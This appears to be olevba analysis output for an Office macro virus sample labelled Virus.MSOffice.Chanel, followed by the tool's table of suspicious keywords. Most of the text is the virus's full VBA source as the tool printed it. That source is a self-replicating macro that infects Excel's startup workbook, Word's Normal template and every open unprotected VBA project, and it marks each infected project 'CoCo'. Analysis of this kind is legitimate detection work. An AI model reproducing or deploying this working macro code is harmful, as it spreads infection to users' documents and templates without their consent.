olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Chanel-0ee6de28472f7da330e25dbff2a91558d16b5740
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Chanel-0ee6de28472f7da330e25dbff2a91558d16b5740 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function FindWindowA Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long: Dim £f As String
Private Sub Document_Close()
On Error Resume Next
£f = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70): £d Application
If FindWindowA("XLMain", 0&) Then £d GetObject(, "Excel.Application"): Exit Sub
Set £j = CreateObject("Excel.Application")
If UCase(Dir(£j.StartupPath + "\Book1.")) <> "BOOK1" Then
Set £c = £j.Workbooks.Add
£c.VBProject.VBComponents(1).CodeModule.InsertLines 1, £f
£c.SaveAs £j.StartupPath & "\Book1."
£c.Quit: End If
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
£f = ThisWorkbook.VBProject.VBComponents(1).CodeModule.Lines(1, 70): £d Application
If FindWindowA("OpusApp", 0&) Then £d GetObject(, "Word.Application"): Exit Sub
Set £j = CreateObject("Word.Application")
If £j.NormalTemplate.VBProject.Description <> "CoCo" Then
£j.NormalTemplate.VBProject.Description = "CoCo"
With £j.NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString £f: End With
£j.Quit: End If
End Sub
Private Sub £d(£o As Object)
For Each £g In £o.VBE.VBProjects
If £g.Protection <> 1 And £g.Description <> "CoCo" Then
£g.Description = "CoCo": With £g.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString £f
End With: End If: Next
End Sub



-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Chanel-0ee6de28472f7da330e25dbff2a91558d16b5740 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Chanel-0ee6de28472f7da330e25dbff2a91558d16b5740 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Chanel-0ee6de28472f7da330e25dbff2a91558d16b5740 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |o.VBE               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

